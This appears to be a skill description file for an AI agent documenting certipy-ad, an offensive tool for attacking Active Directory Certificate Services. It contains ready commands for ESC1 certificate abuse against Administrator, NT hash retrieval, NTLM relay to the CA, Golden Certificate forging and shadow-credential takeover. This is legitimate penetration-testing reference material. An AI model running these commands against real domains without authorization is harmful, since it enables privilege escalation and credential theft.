---
name: certipy-ad
description: Enumerate and abuse Active Directory Certificate Services (AD CS). Use this tool for identifying misconfigured certificate templates, performing NTLM relay to AD CS HTTP endpoints, requesting certificates, authenticating via certificates (PKINIT), and executing various AD CS exploitation techniques like Golden Certificates or Shadow Credentials. Essential for Active Directory security assessments and privilege escalation.
---

# certipy-ad

## Overview
Certipy is a comprehensive offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). It allows attackers to find vulnerabilities in certificate templates, relay NTLM authentication to certificate endpoints, and manage certificates for persistence or privilege escalation. Category: Exploitation / Vulnerability Analysis.

## Installation (if not already installed)
Assume certipy-ad is already installed. If the command is missing:

```bash
sudo apt update && sudo apt install certipy-ad
```

## Common Workflows

### Enumerate AD CS Vulnerabilities
Find misconfigured templates and vulnerable CA settings in the domain:
```bash
certipy-ad find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable
```

### Request a Certificate (ESC1 Exploitation)
Request a certificate for a target user (e.g., Administrator) using a vulnerable template:
```bash
certipy-ad req -u user@domain.local -p password -ca CA-NAME -template VulnerableTemplate -upn administrator@domain.local
```

### Authenticate using a PFX Certificate
Retrieve the NT hash of a user by authenticating with a certificate:
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### NTLM Relay to AD CS
Relay NTLM authentication to the AD CS Web Enrollment endpoint to obtain a certificate:
```bash
certipy-ad relay -target http://ca.domain.local/certsrv/certfnsh.asp -template Machine
```

## Complete Command Reference

### Global Options
| Flag | Description |
|------|-------------|
| `-v`, `--version` | Show Certipy's version number and exit |
| `-h`, `--help` | Show help message and exit |
| `-debug`, `--debug` | Enable debug output |

### Subcommands

#### account
Manage user and machine accounts.
- `create`: Create a new machine account.
- `set`: Change an account's password or other attributes.

#### auth
Authenticate using certificates to retrieve NT hashes or TGTs.
- `-pfx`: Path to the PFX certificate.
- `-dc-ip`: IP address of the domain controller.
- `-ldap-shell`: Open an interactive LDAP shell after authentication.

#### ca
Manage Certificate Authorities and certificates.
- `-ca`: Name of the CA.
- `-backup`: Backup the CA's private key and certificate.

#### cert
Manage certificates and private keys.
- `-pfx`: Path to the PFX file.
- `-export`: Export the private key and certificate from a PFX file.

#### find
Enumerate AD CS environment and identify vulnerabilities.
- `-u`, `-p`: Username and password.
- `-hashes`: LM:NT hashes.
- `-dc-ip`: IP of the Domain Controller.
- `-vulnerable`: Only show vulnerable templates/CAs.
- `-bloodhound`: Export data to BloodHound compatible JSON files.
- `-text`: Save output to a text file.

#### parse
Offline enumeration of AD CS based on registry data.
- `-directory`: Path to the directory containing registry hives.

#### forge
Create Golden Certificates or self-signed certificates.
- `-ca-pfx`: The CA's PFX certificate.
- `-upn`: User Principal Name to forge.
- `-subject`: Subject for the forged certificate.

#### relay
NTLM Relay to AD CS HTTP Endpoints.
- `-target`: URL of the AD CS HTTP endpoint.
- `-template`: Template to request a certificate for.

#### req
Request certificates from a CA.
- `-ca`: Name of the CA.
- `-template`: Name of the certificate template.
- `-upn`: Subject Alternative Name (SAN) to request.
- `-key-size`: Size of the private key.

#### shadow
Abuse Shadow Credentials (msDS-KeyCredentialLink) for account takeover.
- `-u`, `-p`: Username and password.
- `-account`: Target account to add shadow credentials to.

#### template
Manage certificate templates.
- `-template`: Name of the template.
- `-save`: Save the template configuration.

## Notes
- AD CS exploitation often requires a clear path to the Domain Controller (`-dc-ip`).
- When using `find`, the `-bloodhound` flag is highly recommended for visualizing attack paths.
- Ensure your system clock is synchronized with the Domain Controller when using `auth` or `req` to avoid Kerberos errors.